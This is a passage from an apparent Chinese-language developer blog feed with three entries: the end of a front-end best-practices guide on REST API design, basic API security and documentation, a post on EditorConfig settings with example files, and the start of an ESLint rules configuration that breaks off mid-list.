URLs</strong></p><ul><li>资源具有数据，嵌套，和一些操作方法。</li><li>一组资源称为一个集合。</li><li><code>URL</code>标识资源或集合的线上位置</li></ul><blockquote><p>这是针对开发人员（您的主要API使用者）非常著名的设计方式。除了可读性和易用性之外，它还允许我们在无需了解API细节的情况下编写通用库和一些连接器</p></blockquote><ul><li>使用<code>kebab-case</code>（短横线分割）的<code>URL</code>。</li><li>在查询字符串或资源字段中使用<code>camelCase</code>模式。</li><li>在URL中使用多个<code>kebab-case</code>作为资源名称。</li><li>总是使用复数名词来命名指向一个集合的<code>url：/users</code></li></ul><blockquote><p>基本上，它可读性会更好，并可以保持URL的一致性。</p></blockquote><p><strong>在源代码中，将复数转换为具有列表后缀名描述的变量和属性</strong></p><blockquote><p>复数形式的URL非常好，但在源代码中使用它却很微妙而且容易出错，所以要小心谨慎。</p></blockquote><p><strong>坚持这样一个概念：始终以集合名起始并以标识符结束</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/students/<span class="number">245743</span></span><br><span class="line">/airports/kjfk</span><br></pre></td></tr></table></figure><p><strong>避免这样的网址</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /blogs/:blogId/posts/:postId/summary</span><br></pre></td></tr></table></figure><p><strong>这不是在指向资源，而是在指向属性。您完全可以将属性作为参数传递，以减少响应</strong></p><p><strong>URLs里面请尽量少用动词</strong></p><blockquote><p>因为如果您为每个资源操作使用一个动词，您很快就会维护一个很大的URL列表，而且没有一致的使用模式，这会使开发人员难以学习。此外，我们还要使用动词做别的事情</p></blockquote><p><strong>为非资源型请求使用动词。在这种情况下，您的API并不需要返回任何资源。而是去执行一个操作并返回执行结果。这些不是 CRUD（创建，查询，更新和删除）操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/translate?text=Hallo</span><br></pre></td></tr></table></figure><blockquote><p>因为对于 CRUD，我们在资源或集合URL上使用 HTTP 自己带的方法。我们所说的动词实际上是指Controllers。您通常不会开发这些东西</p></blockquote><p><strong>请求体或响应类型如果是JSON，那么请遵循camelCase规范为JSON属性命名来保持一致性</strong></p><blockquote><p>这是一个 JavaScript 项目指南，其中用于生成JSON的编程语言以及用于解析JSON的编程语言被假定为 JavaScript</p></blockquote><p><strong>如何使用HTTP方法来操作CRUD功能</strong></p><ul><li><code>GET</code>: 查询资源的表示法</li><li><code>POST</code>: 创建一些新的资源或者子资源</li><li><code>PUT</code>: 更新一个存在的资源</li><li><code>PATCH</code>: 更新现有资源。它只更新所提供的字段，不管其他字段</li><li><code>DELETE</code>: 删除一个存在的资源</li></ul><p><strong>对于嵌套资源，请在URL中把他们的关系表现出来。例如，使用id将员工与公司联系起来</strong></p><blockquote><p>这是一种自然的方式，方便资源的认知</p></blockquote><ul><li><code>GET /schools/2/students</code> , 应该从学校2得到所有学生的名单</li><li><code>GET /schools/2/students/31</code> , 应该得到学生31的详细信息，且此学生属于学校2</li><li><code>DELETE /schools/2/students/31</code> , 应删除属于学校2的学生31</li><li><code>PUT /schools/2/students/31</code> , 应该更新学生31的信息，仅在资源URL上使用PUT方式，而不要用收集</li><li><code>POST /schools</code> , 应该创建一所新学校，并返回创建的新学校的细节。在集合<code>URL</code>上使用<code>POST</code></li></ul><p><strong>对于具有v前缀（v1，v2）的版本，使用简单的序数。并将其移到URL的左侧，使其具有最高的范围表述</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//api.domain.com/v1/schools/3/students</span></span><br></pre></td></tr></table></figure><blockquote><p>当您的 API 为第三方公开时，升级API会导致发生一些意料之外的影响，也可能导致使用您API的人无法使用您的服务和产品。而这时使用URL中版本化可以防止这种情况的发生</p></blockquote><p><strong>响应消息必须是自我描述的。一个很好的错误消息响应可能如下所示</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"code"</span>: <span class="number">1234</span>,</span><br><span class="line">    <span class="string">"message"</span> : <span class="string">"Something bad happened"</span>,</span><br><span class="line">    <span class="string">"description"</span> : <span class="string">"More details"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>或验证错误:</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"code"</span> : <span class="number">2314</span>,</span><br><span class="line">    <span class="string">"message"</span> : <span class="string">"Validation Failed"</span>,</span><br><span class="line">    <span class="string">"errors"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"code"</span> : <span class="number">1233</span>,</span><br><span class="line">            <span class="string">"field"</span> : <span class="string">"email"</span>,</span><br><span class="line">            <span class="string">"message"</span> : <span class="string">"Invalid email"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"code"</span> : <span class="number">1234</span>,</span><br><span class="line">            <span class="string">"field"</span> : <span class="string">"password"</span>,</span><br><span class="line">            <span class="string">"message"</span> : <span class="string">"No password provided"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>开发人员在使用这些由API​​构建的应用程序时，难免会需要在故障排除和解决问题的关键时刻使用到这些精心设计的错误消息。好的错误消息设计能节约大量的问题排查时间</li><li>_注意：尽可能保持安全异常消息的通用性。例如，别说不正确的密码，您可以换成无效的用户名或密码，以免我们不知不觉地通知用户他的用户名确实是正确的，只有密码不正确。这会让用户很懵逼。</li></ul><p><strong>只使用这8个状态代码，并配合您自定义的响应描述来表述程序工作一切是否正常，客户端应用程序发生了什么错误或API发生错误</strong></p><ul><li><code>200 OK GET</code>, PUT 或 POST 请求响应成功.</li><li><code>201 Created</code> 标识一个新实例创建成功。当创建一个新的实例，请使用POST方法并返回201状态码。</li><li><code>304 Not Modified</code> 发现资源已经缓存在本地，浏览器会自动减少请求次数。</li><li><code>400 Bad Request</code> 请求未被处理，因为服务器不能理解客户端是要什么。</li><li><code>401 Unauthorized</code> 因为请求缺少有效的凭据，应该使用所需的凭据重新发起请求。</li><li><code>403 Forbidden</code> 意味着服务器理解本次请求，但拒绝授权。</li><li><code>404 Not Found</code> 表示未找到请求的资源。</li><li><code>500 Internal Server Error</code> 表示请求本身是有效，但由于某些意外情况，服务器无法实现，服务器发生了故障</li></ul><blockquote><p>大多数 API 提供程序仅仅只使用一小部分 HTTP 状态代码而已。例如，Google GData API 仅使用了10个状态代码，Netflix 使用了9个，而 Digg 只使用了8个。当然，这些响应作为响应主体的附加信息。一共有超过 70 个 HTTP 状态代码。然而，大多数开发者不可能全部记住这 70 个状态码。因此，如果您选择不常用的状态代码，您将使应用程序开发人员厌烦构建应用程序，然后您还要跑到维基百科上面找出您要告诉他们的内容，多累啊</p></blockquote><p><strong>在您的响应中提供资源的总数</strong></p><p><strong>接受limit和offset参数</strong></p><p><strong>还应考虑资源暴露的数据量。API消费者并不总是需要资源的完整表述。可以使用一个字段查询参数，该参数用逗号分隔的字段列表来包括</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /student?fields=id,name,age,class</span><br></pre></td></tr></table></figure><p><strong>分页，过滤和排序功能并不需要从所有资源一开始就要得到支持。记录下那些提供过滤和排序的资源</strong></p><h3 id="9-2-API-安全"><a href="#9-2-API-安全" class="headerlink" title="9.2 API 安全"></a>9.2 API 安全</h3><blockquote><p>这些是一些基本的安全最佳实践</p></blockquote><p><strong>除非通过安全的连接（HTTPS），否则不要只使用基本认证。不要在URL中传输验证令牌：GET /users/123?token=asdf….</strong></p><blockquote><p>因为令牌、用户ID和密码通过网络是明文传递的（它是base64编码，而base64是可逆编码），所以基本认证方案是不安全的</p></blockquote><p><strong>必须使用授权请求头在每个请求上发送令牌：Authorization: Bearer xxxxxx, Extra yyyyy</strong></p><p><strong>授权代码应该是短暂的</strong></p><p><strong>通过不响应任何HTTP请求来拒绝任何非TLS请求，以避免任何不安全的数据交换。响应403 Forbidden的HTTP请求。</strong></p><p><strong>考虑使用速率限制</strong></p><blockquote><p>保护您的API免受每小时数千次的机器人扫描威胁。您应该在早期就考虑实施流控</p></blockquote><p><strong>适当地设置HTTP请求头可以帮助锁定和保护您的Web应用程序</strong></p><p><strong>您的API应将收到的数据转换为规范形式，或直接拒绝响应，并返回400错误请求（400 Bad Request）的错误，并在其中包含有关错误或丢失数据的详细信息</strong></p><p><strong>所有通过Rest API交换的数据必须由API来校验</strong></p><p><strong>序列化JSON</strong></p><blockquote><p>JSON编码器的一个关键问题是阻止任意的可执行代码在浏览器或在服务器中（如果您用nodejs的话）执行。您必须使用适当的JSON序列化程序对用户输入的数据进行正确编码，以防止在浏览器上执行用户提供的输入，这些输入可能会包含恶意代码，而不是正常的用户数据</p></blockquote><p><strong>验证内容类型，主要使用application/*.json（Content-Type 头字段）</strong></p><blockquote><p>例如，接受application/x-www-form-urlencodedMIME类型可以允许攻击者创建一个表单并触发一个简单的POST请求。服务器不应该假定Content-Type。缺少Content-Type请求头或异常的Content-Type请求头，应该让服务器直接以4XX响应内容去拒绝请求</p></blockquote><h3 id="9-3-API-文档"><a href="#9-3-API-文档" class="headerlink" title="9.3 API 文档"></a>9.3 API 文档</h3><ul><li>在README.md模板为 API 填写 API Reference 段落。</li><li>尽量使用示例代码来描述 API 授权方法</li><li>解释 URL 的结构（仅 path，不包括根 URL），包括请求类型（方法）</li></ul><blockquote><p>对于每个端点（endpoint）说明</p></blockquote><p><strong>如果存在 URL 参数就使用 URL 参数，并根据URL中使用到的名称来指定它们</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Required: id=[integer]</span><br><span class="line">Optional: photo_id=[alphanumeric]</span><br></pre></td></tr></table></figure><p><strong>如果请求类型为 POST，请提供如何使用的示例。上述的URL参数规则在这也可以适用。分为可选和必需</strong></p><p><strong>响应成功，应该对应什么样的状态代码，返回了哪些数据？当人们需要知道他们的回调应该是期望的样子，这很有用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Code: <span class="number">200</span></span><br><span class="line">Content: &#123; <span class="attr">id</span> : <span class="number">12</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>错误响应，大多数端点都存在许多失败的可能。从未经授权的访问到错误参数等。所有的（错误描述信息）都应该列在这里。虽然有可能会重复，但它却有助于防止别人的猜想（，减少使用时的排错时间）。例如</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"code"</span>: <span class="number">403</span>,</span><br><span class="line">    <span class="string">"message"</span> : <span class="string">"Authentication failed"</span>,</span><br><span class="line">    <span class="string">"description"</span> : <span class="string">"Invalid username or password"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用API​​设计工具，有很多开源工具可用于提供良好的文档</strong></p><h2 id="10-证书"><a href="#10-证书" class="headerlink" title="10. 证书"></a>10. 证书</h2><blockquote><p>确保您有权使用的这些资源。如果您使用其中的软件库，请记住先查询MIT，Apache或BSD（以更好地了解您所能够拥有的权限），但如果您打算修改它们，请查看许可证详细信息。图像和视频的版权可能会导致法律问题</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;来源于互联网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-Git&quot;&gt;&lt;a href=&quot;#1-Git&quot; class=&quot;headerlink&quot; title=&quot;1.Git&quot;&gt;&lt;/a&gt;1.Git&lt;/h2&gt;&lt;h3 id=&quot;1-1-一些Git规则&quot;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="规范" scheme="http://blog.poetries.top/tags/%E8%A7%84%E8%8C%83/"/>
    
      <category term="最佳实践" scheme="http://blog.poetries.top/tags/%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>editconfig配置</title>
    <link href="http://blog.poetries.top/2018/01/27/editconfig/"/>
    <id>http://blog.poetries.top/2018/01/27/editconfig/</id>
    <published>2018-01-27T14:48:24.000Z</published>
    <updated>2018-04-10T03:33:13.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>在团队开发中，统一的代码格式是必要的。但是不同开发人员的代码风格不同，代码编辑工具的默认格式也不相同，这样就造成代码的<code>differ</code>。而<code>editorConfig</code>可以帮助开发人员在不同的编辑器和IDE中定义和维护一致的编码风格</p></blockquote><h2 id="editorconfig"><a href="#editorconfig" class="headerlink" title="editorconfig"></a>editorconfig</h2><ul><li>一个<code>editorconfig</code>文件例子，用于设置<code>Python</code>和<code>JavaScript</code>行尾和缩进风格的配置文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># EditorConfig is awesome: http://EditorConfig.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># top-most EditorConfig file</span></span><br><span class="line">root = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unix-style newlines with a newline ending every file</span></span><br><span class="line">[*]</span><br><span class="line">end_of_line = lf</span><br><span class="line">insert_final_newline = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matches multiple files with brace expansion notation</span></span><br><span class="line"><span class="comment"># Set default charset</span></span><br><span class="line">[*.&#123;js,py&#125;]</span><br><span class="line">charset = utf-8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 space indentation</span></span><br><span class="line">[*.py]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tab indentation (no size specified)</span></span><br><span class="line">[*.js]</span><br><span class="line">indent_style = tab</span><br><span class="line"></span><br><span class="line"><span class="comment"># Indentation override for all JS under lib directory</span></span><br><span class="line">[lib/**.js]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Matches the exact files either package.json or .travis.yml</span></span><br><span class="line">[&#123;package.json,.travis.yml&#125;]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 2</span><br></pre></td></tr></table></figure><h2 id="安装editorconfig"><a href="#安装editorconfig" class="headerlink" title="安装editorconfig"></a>安装editorconfig</h2><blockquote><p>当打开一个文件时，<code>EditorConfig</code>插件会在打开文件的目录和其每一级父目录查找<code>.editorconfig</code>文件，直到有一个配置文件<code>root=true</code>。<code>EditorConfig</code>配置文件从上往下读取，并且路径最近的文件最后被读取。匹配的配置属性按照属性应用在代码上，所以最接近代码文件的属性优先级最高。</p></blockquote><h2 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h2><blockquote><p><code>EditorConfig</code>文件使用INI格式。斜杠<code>(/)</code>作为路径分隔符，<code>#</code>或者<code>;</code>作为注释。<code>EditorConfig</code>文件使用<code>UTF-8</code>格式、<code>CRLF</code>或<code>LF</code>作为换行符</p></blockquote><p><strong>通配符</strong></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>*</code></td><td>匹配除/之外的任意字符串</td></tr><tr><td><code>**</code></td><td>匹配任意字符串</td></tr><tr><td><code>?</code></td><td>匹配任意单个字符</td></tr><tr><td><code>[name</code>]</td><td>匹配name字符</td></tr><tr><td><code>[!name]</code></td><td>匹配非name字符</td></tr><tr><td><code>{s1,s2,s3}</code></td><td>匹配任意给定的字符串(since 0.11.0)</td></tr></tbody></table><p><strong>属性</strong></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>indent_style</code></td><td>设置缩进风格，tab或者空格。tab是hard tabs，space为soft tabs。</td></tr><tr><td><code>indent_size</code></td><td>缩进的宽度，即列数，整数。如果indent_style为tab，则此属性默认为tab_width。</td></tr><tr><td><code>tab_width</code></td><td>设置tab的列数。默认是indent_size。</td></tr><tr><td><code>end_of_line</code></td><td>换行符，lf、cr和crlf</td></tr><tr><td><code>charset</code></td><td>编码，latin1、utf-8、utf-8-bom、utf-16be和utf-16le，不建议使用utf-8-bom。</td></tr><tr><td><code>trim_trailing_whitespace</code></td><td>设为true表示会除去换行行首的任意空白字符。</td></tr><tr><td><code>insert_final_newline</code></td><td>设为true表明使文件以一个空白行结尾</td></tr><tr><td><code>root</code></td><td>表明是最顶层的配置文件，发现设为true时，才会停止查找.editorconfig文件</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><blockquote><p>下面以<code>sublime text</code>为例，测试<code>editorconfig</code>是否起作用。首先需要给<code>sublime</code>安装<code>EditorConfig</code>插件，然后在项目的根目录新建文件”<code>.editorconfig</code>“，内容如下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># EditorConfig is awesome: &lt;a onclick="javascript:pageTracker._trackPageview('/outgoing/EditorConfig.org');" href="http://EditorConfig.org"&gt;http://EditorConfig.org&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># top-most EditorConfig file</span></span><br><span class="line">root = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unix-style newlines with a newline ending every file</span></span><br><span class="line">[*]</span><br><span class="line">end_of_line = lf</span><br><span class="line">insert_final_newline = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matches multiple files with brace expansion notation</span></span><br><span class="line"><span class="comment"># Set default charset</span></span><br><span class="line">[*.&#123;js,html,css&#125;]</span><br><span class="line">charset = utf-8</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tab indentation (no size specified)</span></span><br><span class="line">[*.js]</span><br><span class="line">indent_style = tab</span><br><span class="line">tab_width = 50</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在团队开发中，统一的代码格式是必要的。但是不同开发人员的代码风格不同，代码编辑工具的默认格式也不相同，这样就造成代
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="规范" scheme="http://blog.poetries.top/tags/%E8%A7%84%E8%8C%83/"/>
    
      <category term="editconfig" scheme="http://blog.poetries.top/tags/editconfig/"/>
    
  </entry>
  
  <entry>
    <title>eslint 常用配置</title>
    <link href="http://blog.poetries.top/2018/01/27/eslint-config/"/>
    <id>http://blog.poetries.top/2018/01/27/eslint-config/</id>
    <published>2018-01-27T14:41:24.000Z</published>
    <updated>2018-04-10T03:33:13.971Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'rules'</span>: &#123;</span><br><span class="line">    <span class="comment">// no-var</span></span><br><span class="line">    <span class="string">'no-var'</span>: <span class="string">'error'</span>,</span><br><span class="line">    <span class="comment">// 要求或禁止 var 声明中的初始化</span></span><br><span class="line">    <span class="string">'init-declarations'</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// 强制使用单引号</span></span><br><span class="line">    <span class="string">'quotes'</span>: [<span class="string">'error'</span>, <span class="string">'single'</span>],</span><br><span class="line">    <span class="comment">// 要求或禁止使用分号而不是 ASI</span></span><br><span class="line">    <span class="string">'semi'</span>: [<span class="string">'error'</span>, <span class="string">'never'</span>],</span><br><span class="line">    <span class="comment">// 禁止不必要的分号</span></span><br><span class="line">    <span class="string">'no-extra-semi'</span>: <span class="string">'error'</span>,</span><br><span class="line">    <span class="comment">// 强制使用一致的换行风格</span></span><br><span class="line">    <span class="string">'linebreak-style'</span>: [<span class="string">'error'</span>, <span class="string">'unix'</span>],</span><br><span class="line">    <span class="comment">// 空格2个</span></span><br><span class="line">    <span class="string">'indent'</span>: [<span class="string">'error'</span>, <span class="number">2</span>, &#123;<span class="string">'SwitchCase'</span>: <span class="number">1</span>&#125;],</span><br><span class="line">    <span class="comment">// 指定数组的元素之间要以空格隔开(,后面)， never参数：[ 之前和 ] 之后不能带空格，always参数：[ 之前和 ] 之后必须带空格</span></span><br><span class="line">    <span class="string">'array-bracket-spacing'</span>: [<span class="number">2</span>, <span class="string">'never'</span>],</span><br><span class="line">    <span class="comment">// 在块级作用域外访问块内定义的变量是否报错提示</span></span><br><span class="line">    <span class="string">'block-scoped-var'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="comment">// if while function 后面的&#123;必须与if在同一行，java风格。</span></span><br><span class="line">    <span class="string">'brace-style'</span>: [<span class="number">2</span>, <span class="string">'1tbs'</span>, &#123;<span class="string">'allowSingleLine'</span>: <span class="literal">true</span>&#125;],</span><br><span class="line">    <span class="comment">// 双峰驼命名格式</span></span><br><span class="line">    <span class="string">'camelcase'</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// 数组和对象键值对最后一个逗号， never参数：不能带末尾的逗号, always参数：必须带末尾的逗号， </span></span><br><span class="line">    <span class="string">'comma-dangle'</span>: [<span class="number">2</span>, <span class="string">'never'</span>],</span><br><span class="line">    <span class="comment">// 控制逗号前后的空格</span></span><br><span class="line">    <span class="string">'comma-spacing'</span>: [<span class="number">2</span>, &#123;<span class="string">'before'</span>: <span class="literal">false</span>, <span class="string">'after'</span>: <span class="literal">true</span>&#125;],</span><br><span class="line">    <span class="comment">// 控制逗号在行尾出现还是在行首出现</span></span><br><span class="line">    <span class="string">'comma-style'</span>: [<span class="number">2</span>, <span class="string">'last'</span>],</span><br><span class="line">    <span class="comment">// 圈复杂度</span></span><br><span class="line">    <span class="string">'complexity'</span>: [<span class="number">2</span>, <span class="number">9</span>],</span><br><span class="line">    <span class="comment">// 以方括号取对象属性时，[ 后面和 ] 前面是否需要空格, 可选参数 never, always</span></span><br><span class="line">    <span class="string">'computed-property-spacing'</span>: [<span class="number">2</span>, <span class="string">'never'</span>],</span><br><span class="line">    <span class="comment">// TODO 关闭 强制方法必须返回值，TypeScript强类型，不配置</span></span><br><span class="line">    <span class="comment">// 'consistent-return': 0</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>更多配置规则说明</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"no-alert"</span>: <span class="number">0</span>,<span class="comment">//禁止使用alert confirm prompt</span></span><br><span class="line"><span class="string">"no-array-constructor"</span>: <span class="number">2</span>,<span class="comment">//禁止使用数组构造器</span></span><br><span class="line"><span class="string">"no-bitwise"</span>: <span class="number">0</span>,<span class="comment">//禁止使用按位运算符</span></span><br><span class="line"><span class="string">"no-caller"</span>: <span class="number">1</span>,<span class="comment">//禁止使用arguments.caller或arguments.callee</span></span><br><span class="line"><span class="string">"no-catch-shadow"</span>: <span class="number">2</span>,<span 